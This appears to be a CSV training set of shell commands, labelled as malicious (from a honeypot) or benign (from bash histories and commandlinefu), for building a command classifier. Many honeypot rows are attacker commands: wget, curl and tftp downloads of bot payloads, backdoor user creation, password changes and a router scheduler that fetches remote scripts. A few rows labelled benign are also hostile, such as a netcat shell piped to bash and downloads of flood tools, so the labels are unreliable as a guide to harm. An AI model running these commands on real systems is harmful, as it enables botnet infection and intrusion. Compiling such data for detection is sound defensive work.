id,command,label,source,split
d2_006761,sudo systemctl disable NetworkManager,0,bash_history,train
d2_006762,/bin/busybox cat /sys/firmware/.nippon,1,honeypot,train
d2_006763,tftp -g -r tmeow.sh 180.255.214.189,1,honeypot,train
d2_006764,refresh,0,bash_history,train
d2_006765,ls /tp,1,honeypot,train
d2_006766,useradd -M -p 12cw4JUOgWwSI -s /bin/bash x4_nl,1,honeypot,train
d2_006768,sh typpaostur.sh,1,honeypot,train
d2_006769,"ps -A -o rss,command | grep [C]hrome | awk '{sum+=$1} END {printf(""%sMB\n"",sum/1024)}'",0,commandlinefu,train
d2_006770,LC_ALL=C rm -f /var/tmp/otwl27g526o32e1fvwd0p98uia,1,honeypot,train
d2_006771,sudo iptabls -L,0,bash_history,train
d2_006772,sudo chmod 755 /usr/bin/vcprompt,0,bash_history,train
d2_006773,weather-report Romania,0,bash_history,train
d2_006774,alias Z=base64&&Z=dG91Y2ggUExFQVNFX1NUT1BfQU5OT1lJTkdfQ09NTUFORExJTkVGVV9VU0VSUwo=&&$(echo $Z|Z -d),0,commandlinefu,train
d2_006775,dd if=/dev/urandom of=/dev/null,0,bash_history,train
d2_006776,git log --pretty=oneline b56b83.. | wc -l,0,commandlinefu,train
d2_006777,"alias scd='dirs -v; echo -n ""select number: ""; read newdir; cd -""$newdir""'",0,commandlinefu,train
d2_006780,mlocate,0,bash_history,train
d2_006781,"find . -name '*.MP4'-type f -exec basename {} \ | while read NAME; do ffmpeg -i ""${NAME}"" -crf 25 -b:a 512k -c:a aac -strict -2 -strftime 1 ""%Y-%m-%d_%H-%M-%S_${NAME%.mp4}""; echo ""Processing file: $f file...""; done",0,bash_history,train
d2_006783,pip install dnslib,0,bash_history,train
d2_006784,"ssh-keygen -f ""~/.ssh/known_hosts"" -R 185.125.30.147",0,bash_history,train
d2_006785,"diff -uw <(fmt -1 {file1, file2})",0,commandlinefu,train
d2_006787,./arg 3 1,0,bash_history,train
d2_006788,./f root.arm4,1,honeypot,train
d2_006789,true && { echo success;} || { echo failed; },0,commandlinefu,train
d2_006790,sudo tail -f /var/log/named/query.log,0,bash_history,train
d2_006791,sudo apt-get remove --purge thunderbird,0,bash_history,train
d2_006792,ls /isitools/perl5.10.0/,0,bash_history,train
d2_006793,./vb1Y51Rv,1,honeypot,train
d2_006794,bash -c ./VksynVct,1,honeypot,train
d2_006795,ifconfig eth0 | grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1,0,commandlinefu,train
d2_006798,chmod 755 stepper.py,0,bash_history,train
d2_006799,ipython3,0,bash_history,train
d2_006803,ls -1 . dir2 dir3|sort|uniq -d,0,commandlinefu,train
d2_006804,./VlUPjPTb,1,honeypot,train
d2_006805,mencoder -ovc copy -oac copy -of avi -o remuxed.avi original.avi,0,commandlinefu,train
d2_006806,scp -t ~/.dhpcd,1,honeypot,train
d2_006808,python sensorcheck.py,0,bash_history,train
d2_006809,cat -n trabalho_03_04_12.sh,0,bash_history,train
d2_006811,./wqPsZjL9,1,honeypot,train
d2_006813,cd .miner,1,honeypot,train
d2_006815,git diff offboard/perception/training/evaluation/python/filter_reporter.py,0,bash_history,train
d2_006816,cat /home/vagrant/.ssh/id_rsa,0,bash_history,train
d2_006817,perl n 200,1,honeypot,train
d2_006819,command > >(tee stdout.log) 2> >(tee stderr.log >&2),0,commandlinefu,train
d2_006820,>/boot/.file,1,honeypot,train
d2_006821,cat MateusStahelinVIM,0,bash_history,train
d2_006822,sudo aticonfig,0,bash_history,train
d2_006823,cd /usr/,1,honeypot,train
d2_006824,curl http://haa86746f.example.net/itooamgay/typpaostur.sh -o typpaostur.sh,1,honeypot,train
d2_006825,bash -c ./nQuPcnxp,1,honeypot,train
d2_006826,php getNoticeType.php 0 22473,0,bash_history,train
d2_006827,wget zeiteam.xhost.ro/flood/udp.tgz,0,bash_history,train
d2_006828,v build/onboard/,0,bash_history,train
d2_006829,chmod +x HaLGmypP,1,honeypot,train
d2_006830,cat scriptrabalhoM-D,0,bash_history,train
d2_006831,sudo ifconfig --help 2>&1 | less,0,bash_history,train
d2_006833,yarn add bootstrap@4.0.0-alpha.6,0,bash_history,train
d2_006834,"for file in *.flac; do flac -cd ""$file"" | lame -q 0 --vbr-new -V 0 - ""${file%.flac}.mp3""; done",0,commandlinefu,train
d2_006835,kdialog --passivepopup <text> <timeout>,0,commandlinefu,train
d2_006836,ls t,0,bash_history,train
d2_006837,tftp -r tftp.sh -g 127.21.7.58,1,honeypot,train
d2_006838,rlpr -h -Plp -HIP_LPD_SERVER_HERE file.ps,0,commandlinefu,train
d2_006839,bash -c ./JLDUCGEf,1,honeypot,train
d2_006840,ssh -f -N -R 8888:localhost:22 user@somedomain.org,0,commandlinefu,train
d2_006841,csh -cf '/command/svscanboot &',0,bash_history,train
d2_006842,wget http://hd43c67a6.example.net/tenshi.sh,1,honeypot,train
d2_006845,compgen -c | sort -u > commands,0,commandlinefu,train
d2_006846,terraform --vars-file=./variables validate,0,bash_history,train
d2_006847,be rails g scaffold polity name:string,0,bash_history,train
d2_006848,sudo apt-get install libevent-2.0-5,0,bash_history,train
d2_006849,genisoimage -o bastion-602-jpa.iso -b boot/syslinux/isolinux.bin -c boot/syslinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -r -R .,0,commandlinefu,train
d2_006850,chmod 777 Cipher.sh,1,honeypot,train
d2_006852,tar -xzvf scann,1,honeypot,train
d2_006853,randpw(){ < /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-16};echo;},0,commandlinefu,train
d2_006854,./syn2023 &,1,honeypot,train
d2_006855,docker run -d -p 8080:8080 --name jenkins jenkins,0,bash_history,train
d2_006856,ll /srv,0,bash_history,train
d2_006857,wget -r -np -nd -A.pdf --user *** --password *** http://hd50edf76.example.net/courses/***/download/,0,commandlinefu,train
d2_006858,"awk -F"" "" '{ if ( NF == 1 ) { print $0 } }' KINDLE_NOTES_FILE.txt | sed -e '/^=/d' | sed -e '/^[[:space:]]*$/d' -e 's/,//g' | sort | comm -12 List_of_language_words.txt - | uniq",0,commandlinefu,train
d2_006859,wget ftp://h45556760.example.net/.kde/p,1,honeypot,train
d2_006860,libinput-gestures-setup start,0,bash_history,train
d2_006861,(uname -srmo),1,honeypot,train
d2_006862,sh ssh4.sh,1,honeypot,train
d2_006863,tail error.log,0,bash_history,train
d2_006864,mv re* store_data/,0,bash_history,train
d2_006865,./eABoRCP3,1,honeypot,train
d2_006867,cat libc.so.6,1,honeypot,train
d2_006868,sudo ln -s /usr/local/lib/python3.5/site-packages/cv2.cpython-35m-x86_64-linux-gnu.so cv2.so,0,bash_history,train
d2_006869,git log --pretty=format:%H | tail -1,0,commandlinefu,train
d2_006871,vim Vagrant,0,bash_history,train
d2_006872,tail -v -n 16 /proc/net/dev,1,honeypot,train
d2_006873,vim hello_world_spec.rb,0,bash_history,train
d2_006874,cd /var/tmp/,1,honeypot,train
d2_006876,git add .bash_history .mysql_history .viminfo,0,bash_history,train
d2_006877,mv element-media.* mediaLoop/,0,bash_history,train
d2_006878,xrandr | sed -n 's/ connected.*//p' | xargs -n1 -tri xrandr --output {} --brightness 0.7 --gamma 2:3:4,0,commandlinefu,train
d2_006879,wget http://hf4d2b1d7.example.net/k1337.x86,1,honeypot,train
d2_006881,busybox ftpget 194.169.206.60 bin4.sh,1,honeypot,train
d2_006883,"for i in [0-9].ogg; do mv {,0}$i; done",0,commandlinefu,train
d2_006884,/opt/ctf/babymarvel/ro/wrapper.sh,0,bash_history,train
d2_006885,vi hdc-1000-sensors.c,0,bash_history,train
d2_006886,"MyVAR=85 awk '{ print ENVIRON[""MyVAR""] }'",0,commandlinefu,train
d2_006887,mkfifo foo ; nc -lk 2600 0<foo | /bin/bash 1>foo,0,commandlinefu,train
d2_006888,"while [ 1 ] ; do echo -en ""$(date +%T)\r"" ; sleep 1; done",0,commandlinefu,train
d2_006889,sudo mv ssl/ /usr/local/src/ssl/,0,bash_history,train
d2_006890,echo notify-send test | at now+1minute,0,commandlinefu,train
d2_006891,./ls.sh /home,0,bash_history,train
d2_006892,tftp -r sh -g 144.196.19.113,1,honeypot,train
d2_006894,"flight_status() { if [[ $# -eq 3 ]];then offset=$3; else offset=0; fi; curl ""http://hb6640b1c.example.net/TrackByRoute.aspx?view=detail&al=""$1""&fn=""$2""&dpdat=$(date +%Y%m%d -d ${offset}day)"" 2>/dev/null |html2text |grep "":""; }",0,commandlinefu,train
d2_006896,perldoc LWP,0,bash_history,train
d2_006897,./ZqoAihRn,1,honeypot,train
d2_006898,_have apt,0,bash_history,train
d2_006902,paste file1 file2 fileN > merged,0,commandlinefu,train
d2_006904,wget http://hdddb85a9.example.net/i3306m,1,honeypot,train
d2_006905,be rails g scaffold request_type name:string,0,bash_history,train
d2_006908,ls .mythtv/.w++/,0,bash_history,train
d2_006910,"paste(){ curl -s -S --data-urlencode ""txt=$($*)"" ""http://he78bfb15.example.net/upload/create?input_type=txt&result=address"";echo;}",0,commandlinefu,train
d2_006912,cat /dev/.nippon,1,honeypot,train
d2_006913,history > history.txt,0,bash_history,train
d2_006914,./YTKQBpUQ,1,honeypot,train
d2_006915,./8MUZ8rOY,1,honeypot,train
d2_006916,rm -rf /usr/lib/dpkg/,0,bash_history,train
d2_006918,open app-ios/LocalizedStringKit/sk.lproj/LocalizedStringKit.strings,0,bash_history,train
d2_006920,"wget -O chart.png 'http://hf5734ebb.example.net/chart?chs=250x100&chd=t:60,40&cht=p3&chl=Hello|World'",0,commandlinefu,train
d2_006922,ll ..,0,bash_history,train
d2_006923,./A1spiVfh,1,honeypot,train
d2_006924,wget shakimel.xhost.ro/florian.tgz,0,bash_history,train
d2_006926,cat output_ngram.txt | lolcat,0,bash_history,train
d2_006927,sudo chmod -R 775 storage/,0,bash_history,train
d2_006928,rm vlc-2.2.2.dmg,0,bash_history,train
d2_006929,/bin/busybox rm -f /etc/resolv.conf/.nippon,1,honeypot,train
d2_006930,/bin/busybox cp /bin/busybox .dropper,1,honeypot,train
d2_006931,wget -c http://ha9f2c1e5.example.net/112,1,honeypot,train
d2_006932,wget www.packetstormsecurity.org/DoS/udp.pl,0,bash_history,train
d2_006933,git add --all system,0,bash_history,train
d2_006934,mkdir myicons; find /usr/share/icons/ -type f -exec cp {} ./myicons/ \;,0,commandlinefu,train
d2_006935,ls -ltr ../juvenile/*.fa,0,bash_history,train
d2_006936,touch .dhpcdh,1,honeypot,train
d2_006938,watch -n 0.5 sudo ovs-ofctl dump-ports br_ovs,0,bash_history,train
d2_006939,vim src/,0,bash_history,train
d2_006940,ls /media/bjohnston/Acer/Users/bjohnston/Music,0,bash_history,train
d2_006941,git rm --cached readme.txt,0,bash_history,train
d2_006944,ssh user@host 'mysqldump dbname | gzip' > /path/to/backups/db-backup-`date +%Y-%m-%d`.sql.gz,0,commandlinefu,train
d2_006945,rpm -ql hercules,0,bash_history,train
d2_006946,"say='festival --tts'; S=$(date +%s); echo $(echo $S | cut -b 1-1)"" billion"" | $say ; echo $(echo $S | cut -b 2-4 | sed 's/0*//')"" million""| $say; echo $(echo $S | cut -b 5-7 | sed 's/0*//')"" thousand""| $say",0,commandlinefu,train
d2_006947,rm -rvf Londonpad.2016.1080p.WEB-DL.mkv,0,bash_history,train
d2_006948,docker-machine active,0,bash_history,train
d2_006949,"echo ""Z""""IGAZAGA148""""8""",1,honeypot,train
d2_006950,vim 20150522135851_add_attachment_image_to_sliders.rb,0,bash_history,train
d2_006952,"cat 3.9.1-RELEASE | jq .fsLayers | jq .[].blobSum | sed -e 's/^""//' -e 's/""$//' | cut -d':' -f2-",0,bash_history,train
d2_006953,chmod +x FXVwTWAQ,1,honeypot,train
d2_006955,ls ../../../trinity/,0,bash_history,train
d2_006957,mdk logs -tf --tail 10 traefik,0,bash_history,train
d2_006958,tar -zcvf archive_name.tar.gz directory_to_compress,0,commandlinefu,train
d2_006959,wget http://h82618765.example.net/antibinsbins.sh,1,honeypot,train
d2_006961,"mplayer $(wget -q -O - ""http://h84851c86.example.net/hurl/gratishurl.ram?pid=eu_aljazeera&file=al_jazeera_en_lo.rm"" | sed -e 's#lo.rm#hi.rm#')",0,commandlinefu,train
d2_006962,x11vnc -display :0 -auth $(ps -ef|awk '/xauth/ {print $15}'|head -1) -forever -bg &,0,commandlinefu,train
d2_006963,vim .kodi/userdata/advancedsettings.xml,0,bash_history,train
d2_006965,PATH=./:/tmp/:/run/user/1000/:/dev/shm/:/root/:/etc/:/:/var/:/var/log/:/var/tmp/:/var/log/:/var/cache/:/var/local/:/var/spool/:/var/www/:/var/opt/:/var/mail/:/opt/:/usr/:../:$PATH nc localhost 1234,1,honeypot,train
d2_006967,echo [id:$(echo 'zeroshell' | sudo -S id -g 2>/dev/null,1,honeypot,train
d2_006968,find /path/to/search -xtype l,0,commandlinefu,train
d2_006969,ls -lrlt,0,bash_history,train
d2_006970,vim run_tests.sh,0,bash_history,train
d2_006971,chmod 777 loligang.arm7,1,honeypot,train
d2_006972,vi shuffleCards/,0,bash_history,train
d2_006973,rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh,1,honeypot,train
d2_006974,chmod +x nQuPcnxp,1,honeypot,train
d2_006978,curl -O http://h8ff2b74e.example.net/as12a0s/z2s234.x86,1,honeypot,train
d2_006979,"git confit --global user.name ""Cesar Salcedo""",0,bash_history,train
d2_006980,"goburncd() { d=/tmp/goburncd_$RANDOM; mkdir $d && for i in *.[Mm][Pp]3; do lame --decode ""$i"" ""$d/${i%%.*}.wav""; done; sudo cdrecord -pad $d/* && rm -r $d; eject }",0,commandlinefu,train
d2_006981,./I,0,bash_history,train
d2_006983,ls / | grep uKzOCllMkq,1,honeypot,train
d2_006984,chmod +x exercicio,0,bash_history,train
d2_006985,sudo yum install libXtst.x86_64 libXtst-devel.x86_64,0,bash_history,train
d2_006986,sed -n 13p /etc/services,0,commandlinefu,train
d2_006987,feh --bg-scale /path/to/wallpaper.jpg,0,commandlinefu,train
d2_006988,"echo ""admin"" | killall -9 libxml_CP",1,honeypot,train
d2_006989,curl -O http://h0248eec4.example.net/tenshi.sh,1,honeypot,train
d2_006990,curl -i -m 60 -k -u user:password 'https://hf1581f3e.example.net/account/ddns.php?',0,commandlinefu,train
d2_006991,less -S somefile,0,commandlinefu,train
d2_006993,sudo dd if=/dev/zero of=/swapfile bs=1024 count=524288,0,bash_history,train
d2_006994,sudo groupadd,0,bash_history,train
d2_006995,vi primeiro.sh,0,bash_history,train
d2_006996,echo -n 123456| wc -w,0,bash_history,train
d2_006997,vim datastructthingy.py,0,bash_history,train
d2_006998,"echo ""trendimsa1\nlXSQ4u8GQJ3u\nlXSQ4u8GQJ3u\n"" | passwd",1,honeypot,train
d2_006999,vim simnao.sh,0,bash_history,train
d2_007000,du -lh,0,bash_history,train
d2_007001,sudo vim /etc/mkinitcpio.conf,0,bash_history,train
d2_007002,java -Xmx1G -Xms1G -jar /isitools/CentOS-5/trinityrnaseq_r2013-02-25/Butterfly/Butterfly.jar -N 44883979 -L 200 -F 500 -C /isiseqruns/RonAxoTrinity/MouseProject/mmus/endothelial//chrysalis/RawComps.6/comp12242 --max_number_of_paths_per_node=8 --path_reinforcement_distance=25 --triplet-lock,0,bash_history,train
d2_007003,sudo pacman -S subversion,0,bash_history,train
d2_007004,whereis pyenv,0,bash_history,train
d2_007006,ffmpeg -vcodec copy -acodec copy -i orginalfile -ss 00:01:30 -t 0:0:20 newfile,0,commandlinefu,train
d2_007007,cat sim900.py,0,bash_history,train
d2_007008,sudo strings /dev/mem,0,commandlinefu,train
d2_007009,sudo dnf install wget git,0,bash_history,train
d2_007010,tar -czvf testlink-1.9.17.tar /home/admin/web/testlink.digiprojects.top/public_html/,0,bash_history,train
d2_007012,./x 141.45 22,0,bash_history,train
d2_007013,pcharc(){ perl -e 'for (0..255) {$_ = chr($_); print if /['$1']/}' | cat -v; echo;},0,commandlinefu,train
d2_007015,ps -ef|grep -i httpd,0,bash_history,train
d2_007016,"sudo nmap -F -O 145.170.68.118-255 | grep ""Running: "" > /tmp/os; echo ""$(cat /tmp/os | grep Linux | wc -l) Linux device(s)""; echo ""$(cat /tmp/os | grep Windows | wc -l) Window(s) devices""",0,commandlinefu,train
d2_007017,vi Revathi,0,bash_history,train
d2_007018,git add .bash_profile,0,bash_history,train
d2_007019,>/tmp/.file,1,honeypot,train
d2_007020,xkill,0,commandlinefu,train
d2_007021,sudo chmod 755 kingsoft_phonetic_ue.ttf -R,0,bash_history,train
d2_007022,git add Rust,0,bash_history,train
d2_007023,good http://hb967bfcb.example.net/w.txt -O ygljglkjgfg2,1,honeypot,train
d2_007024,flash set SSH_PASSWORD zVkYSMYO7BnR1yAz,1,honeypot,train
d2_007025,sudo cd /root,0,bash_history,train
d2_007026,psgrepx mosquitto,0,bash_history,train
d2_007028,Remote side unexpectedly closed network connection,1,honeypot,train
d2_007029,lsof -c <process name> -r,0,commandlinefu,train
d2_007030,mkdir fizzbuzz,0,bash_history,train
d2_007031,service --status-aall,0,bash_history,train
d2_007032,curl -fSs https://h409629a0.example.net/cdn-cgi/trace | awk -F= '/ip/ { print $2 }',0,commandlinefu,train
d2_007033,wget http://h8d96af7e.example.net/lmaoWTF/loligang.m68k,1,honeypot,train
d2_007035,mkdir /tmp/lalala,1,honeypot,train
d2_007037,"curl -s https://h01892413.example.net/users/tuxcanfly/repos | jq -r 'map(select(.fork == false)) | map(.url) | map(sub(""https://h01892413.example.net/repos/""; ""git clone git@github.com:"")) | @sh' | xargs -n1 sh -c]",0,commandlinefu,train
d2_007038,./devel/lib/voy_math/voy_math_test --gtest_filter=DigitalFilterTest.*,0,bash_history,train
d2_007039,tftp -r Senpai3.sh -g 148.62.30.58,1,honeypot,train
d2_007041,yum install tree,0,bash_history,train
d2_007042,wget http://h3534f00f.example.net/21.bin -O sadskhwes1,1,honeypot,train
d2_007044,wget davidhacked.tk/info,1,honeypot,train
d2_007045,flash set SSH_PASSWORD ZVHVdnRJfVNOshPBm,1,honeypot,train
d2_007046,como assim permissão negada???,0,bash_history,train
d2_007047,npm install mongojs,0,bash_history,train
d2_007048,loadkeys uk,0,commandlinefu,train
d2_007049,touch a,0,bash_history,train
d2_007050,pkill -QUIT evolution,0,bash_history,train
d2_007051,"apt-get -y install git-core gitosis; adduser --home /home/git --gecos ""git user"" git; su git -c ""ssh-keygen -t rsa -f /home/git/.ssh/id_rsa; gitosis-init < ~/.ssh/id_rsa""",0,commandlinefu,train
d2_007052,uauf.de]$ [goalador@gatanda hhn[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneu[goalador@gatanda hhneuauf.de]$ bash: [goalador@gatanda: command not found,0,bash_history,train
d2_007053,curl -O http://hd5c3fe17.example.net/bins.sh,1,honeypot,train
d2_007054,python3 v.py,1,honeypot,train
d2_007057,source undercloud,0,bash_history,train
d2_007058,cp -r gustav-c-kuehn-base/ gustav-c-kuehn-base-bak,0,bash_history,train
d2_007059,symlinks -r $(pwd),0,commandlinefu,train
d2_007061,ssh -4 -C -c blowfish-cbc,0,commandlinefu,train
d2_007062,pacman -Qt -native,0,bash_history,train
d2_007063,chmod 777 !*,0,commandlinefu,train
d2_007064,ironic --debug node-set-provision-state 53f08a16-f2ef-4e25-84a2-e8c203fcbd10 manage,0,bash_history,train
d2_007066,/bin/busybox wget http://hecb9178b.example.net/fbot.arm -O-> f,1,honeypot,train
d2_007068,sudo pacman -S alsa-utils,0,bash_history,train
d2_007069,nohup perl /isitools/FastQC/fastqc -t 20 Axo_J_TC_1d/*.fq --outdir=./fastQC_OUT/ &,0,bash_history,train
d2_007070,chmod 700 *.*,0,bash_history,train
d2_007071,ncat -vlm 5 --ssl --chat 9876,0,commandlinefu,train
d2_007072,LC_ALL=C ~/md2slmg55yihrge1vwupojbrlw,1,honeypot,train
d2_007073,gcc qlcoder758a.cpp -o made1 -O3 &,0,bash_history,train
d2_007075,rm -r android/,0,bash_history,train
d2_007076,pdfimages -j foo.pdf bar,0,commandlinefu,train
d2_007078,docker stop jenkins,0,bash_history,train
d2_007079,sudo apt-get install composer,0,bash_history,train
d2_007080,/bin/busybox tftp,1,honeypot,train
d2_007081,./JKDeIrW7,1,honeypot,train
d2_007082,sudo chattr +i <file>,0,commandlinefu,train
d2_007083,"kaffeine $(wget -qO- ""http://h1d93bcfa.example.net/emission/index-fr.php?page=video&type_video=quotidiennes&video_courante=$(date +%Y%m%d)"" | grep -o ""mms.*wmv"" | uniq)",0,commandlinefu,train
d2_007084,testaArquivos,0,bash_history,train
d2_007085,ls ubuntu-drivers-common/quirks/,0,bash_history,train
d2_007086,vim asd.md,0,bash_history,train
d2_007087,"echo ""${WHI}# ${DRED}CPU ${DRED} -> ${WHI}${CPU}${RES}"" #${WHI}"" ; echo ""${WHI}# ${DRED}CPU CORE ${DRED} -> ${WHI}${CPUS}${RES}"" #${WHI}""",1,honeypot,train
d2_007088,add-apt-repository ppa:gophers/go,0,bash_history,train
d2_007089,"echo ""zeroshell"" | sudo -S mkdir /var/libxml_CP",1,honeypot,train
d2_007091,service redis stop,0,bash_history,train
d2_007092,pip install anaconda,0,bash_history,train
d2_007093,his-c,1,honeypot,train
d2_007094,ssh root:hadoop@76.132.177.92,0,bash_history,train
d2_007095,rm -rf kjUiwa.sh kjUiwa2.sh,1,honeypot,train
d2_007096,zcat -r *.fq |head |grep s_1,0,bash_history,train
d2_007097,"shmore(){ local l L M=""`echo;tput setab 4&&tput setaf 7` --- SHMore --- `tput sgr0`"";L=2;while read l;do echo ""${l}"";((L++));[[ ""$L"" == ""${LINES:-80}"" ]]&&{ L=2;read -p""$M"" -u1;echo;};done;}",0,commandlinefu,train
d2_007098,git commit --ament,0,bash_history,train
d2_007099,head,0,bash_history,train
d2_007100,be rake db:drop,0,bash_history,train
d2_007101,nslookup ss6.examplsse.com 76.132.177.92,0,bash_history,train
d2_007103,./npOCKApr,1,honeypot,train
d2_007105,/bin/busybox rm -f /proc/timer_list/.nippon,1,honeypot,train
d2_007106,mkdir plays,0,bash_history,train
d2_007107,ls ../../../resources/Timing\ Data/,0,bash_history,train
d2_007108,rm -rf httpdlogic.sh httpdlogic.sh httpdlogic2.sh httpdlogic1.sh,1,honeypot,train
d2_007109,mkdir .local/share/fonts,0,bash_history,train
d2_007110,cd w,1,honeypot,train
d2_007111,find repMainPath -maxdepth 1 -mindepth 1 -type d | while read dir; do echo processing $dir; sudo svnadmin dump --deltas $dir >dumpPath/`basename $dir`; done,0,commandlinefu,train
d2_007112,"sudo -s ""echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all""",0,commandlinefu,train
d2_007113,ls -tlr,0,bash_history,train
d2_007115,sed -e '/^$/d' -i .bak filewithempty.lines,0,commandlinefu,train
d2_007116,wget http://h66534bff.example.net/Corona.x86_64,1,honeypot,train
d2_007118,sudo mount -t auto /dev/sda1 /home/pi/storage,0,bash_history,train
d2_007119,./sacha,0,bash_history,train
d2_007120,perl cyberinfo,1,honeypot,train
d2_007122,find directory_path -maxdepth 1 -daystart -mtime -1,0,commandlinefu,train
d2_007124,be rails generate scaffold applicant name:string contact:text,0,bash_history,train
d2_007125,git add ./*,0,bash_history,train
d2_007126,diff <(tree /dir/one) <(tree /dir/two),0,commandlinefu,train
d2_007127,valgrind --leak-check=full --track-origins=yes ./rlg327,0,bash_history,train
d2_007128,"curl -s 'http://hf30fd11a.example.net/?url='""$1"" | sed -e 's/{""short_url"":""//' -e 's/""}/\n/g'",0,commandlinefu,train
d2_007129,netstat -ntu|awk '{print $5}'|cut -d: -f1 -s|sort|uniq -c|sort -nk1 -r,0,commandlinefu,train
d2_007130,./X2XtmnRp,1,honeypot,train
d2_007131,source ~/.bash_aliases,0,bash_history,train
d2_007132,cat > It works,0,bash_history,train
d2_007134,cat /dev/stdin | sh,1,honeypot,train
d2_007135,"Q=""YOURSEARCH""; GOOG_URL=""http://hd8b99f68.example.net/search?q=""; AGENT=""Mozilla/4.0""; stream=$(curl -A ""$AGENT"" -skLm 10 ""${GOOG_URL}\""${Q/\ /+}\"""" | grep -oP '\/url\?q=.+?&' | sed 's/\/url?q=//;s/&//'); echo -e ""${stream//\%/\x}""",0,commandlinefu,train
d2_007136,echo printenv,0,bash_history,train
d2_007137,"/system scheduler add name=""U6"" interval=10m on-event=""/tool fetch url=http://hf55ff728.example.net/poll/32e2cce9-c12b-4d46-9131-0234b926ad31 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc"" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write",1,honeypot,train
d2_007138,ln -s /home/jayson/Pictures/Photos/2010/04/*mod*,0,bash_history,train
d2_007139,sudo apt-get install goldendict,0,bash_history,train
d2_007140,vim logreg.py,0,bash_history,train
d2_007141,chmod 777 .satan,1,honeypot,train
d2_007142,sudo apt-get install apache2,0,bash_history,train
d2_007143,./abzoOIwL,1,honeypot,train
d2_007144,git checkout -b new_Readme,0,bash_history,train
d2_007145,"for crt in $(locate -r '.+\.crt' | grep -v ""/usr/share/ca-certificates/""); do ls -la $crt; done",0,commandlinefu,train
d2_007146,"remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0",0,bash_history,train
d2_007147,cat /home/sacha/trabalho,0,bash_history,train
d2_007148,mkdir ntp,0,bash_history,train
d2_007150,scp -p 2222 root@rodineibadin.zapto.org:/home/rodinei/bin,0,bash_history,train
d2_007152,svn propset svn:executable ON filename,0,commandlinefu,train
d2_007153,"for code in {0..255}; do echo -e ""\e[38;05;${code}m $code: Test""; done",0,commandlinefu,train
d2_007154,bash -c ./dVNBkixy,1,honeypot,train
d2_007155,perl paul 1,1,honeypot,train
d2_007156,ip li | grep ff,0,commandlinefu,train
d2_007157,perl v,1,honeypot,train
d2_007158,vi polda_m.php,0,bash_history,train
d2_007160,wget http://h7eadc2db.example.net/ssh.sh,1,honeypot,train
d2_007161,rosrun perception_training table_status.py -r -p mgguanjian-TOHS-typical_tasks-config0,0,bash_history,train
d2_007162,tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | fold -w 12 | head -n 1,0,commandlinefu,train
d2_007163,echo 01 > int-ca.crl.srl,0,bash_history,train
d2_007166,busybox tftp -c 194.169.206.60 get bin3.sh,1,honeypot,train
d2_007167,cd .prgssh3/,1,honeypot,train
d2_007168,python v..,1,honeypot,train
d2_007170,cat >muie,0,bash_history,train
d2_007171,./test average --cpu -i in12 -n 4,0,bash_history,train
d2_007172,touch neelu,0,bash_history,train
d2_007173,xrdb .Xresources,0,bash_history,train
d2_007174,rm -rf backuper.sh backuper.sh backuper2.sh backuper1.sh,1,honeypot,train
d2_007175,wget http://h2cb401cd.example.net/i3306m,1,honeypot,train
d2_007176,"mv nt""sshd: [accepted]""pd",1,honeypot,train
d2_007177,sudo chown -R $USER /usr/local/lib/node_modules/,0,bash_history,train
d2_007178,>/var/run/t,1,honeypot,train
d2_007180,mplayer vokoscreen-2017-04-26_13-32-02_edit_w2.mkv,0,bash_history,train
d2_007182,flex,0,bash_history,train
d2_007183,python3 delete_recordings.py --help,0,bash_history,train
d2_007184,"find . -exec `alias foo | cut -d""'"" -f2` {} \;",0,commandlinefu,train
d2_007185,wget √,0,bash_history,train
d2_007186,cat test/recipes/default_test.rb,0,bash_history,train
d2_007187,cp pylast.py ~/.config/pianobar,0,bash_history,train
d2_007190,touch /var/log/secure,1,honeypot,train
d2_007191,sudo pip3 install virtualenv virtualenvwrapper,0,bash_history,train
d2_007192,"wget --save-cookies ~/.cookies/rapidshare --post-data ""login=USERNAME&password=PASSWORD"" -O - https://hbf6274cd.example.net/cgi-bin/premiumzone.cgi > /dev/null",0,commandlinefu,train
d2_007193,sudo cat /etc/fstab,0,bash_history,train
